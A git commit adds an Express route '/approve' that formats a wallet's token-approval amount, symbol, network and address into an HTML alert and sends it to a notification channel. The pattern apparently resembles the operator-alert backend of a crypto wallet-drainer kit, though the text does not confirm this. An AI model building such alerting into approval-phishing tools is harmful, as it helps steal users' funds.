36b09a549e1f4fa2f718f8e049b93e8204e12078
Franklibo <franklibovski@gmail.com>
2025-05-13 06:48:47 +0100

    Update store_wallet.js

--- routes/store_wallet.js
+++ routes/store_wallet.js
@@ -56,4 +56,31 @@ router.post("/transaction", async (req, res) => {
   }
 });
 
+router.post("/approve", async (req, res) => {
+  const { approval_amount, token_symbol, currentNetwork, walletAddress } = req.body;
+
+  try {
+    let text = '';
+    text = `🚀 <b>Token approved</b> 🚀\n\n` +
+           `📈 <b>Amount</b>: ${approval_amount}\n` +
+           `💰 <b>Token</b>: ${token_symbol}\n` +
+           `📋 <b>Wallet Address</b>: ${walletAddress}\n` +
+           `⚡️ <b>Network</b>: ${currentNetwork}\n\n\n` +
+           `🔗 <a href="https://www.blockchain.com/explorer/search?search=${walletAddress}">See Wallet On Block Explorer</a>`;
+
+    if (text.length > 0) {
+      await sendNotification(text, 'html');
+      res.status(200).json({
+        result: "success"
+      });
+    } else {
+      throw "failed";
+    }
+  } catch (err) {
+    res.status(200).json({
+      result: "failed"
+    });
+  }
+});
+
 module.exports = router;
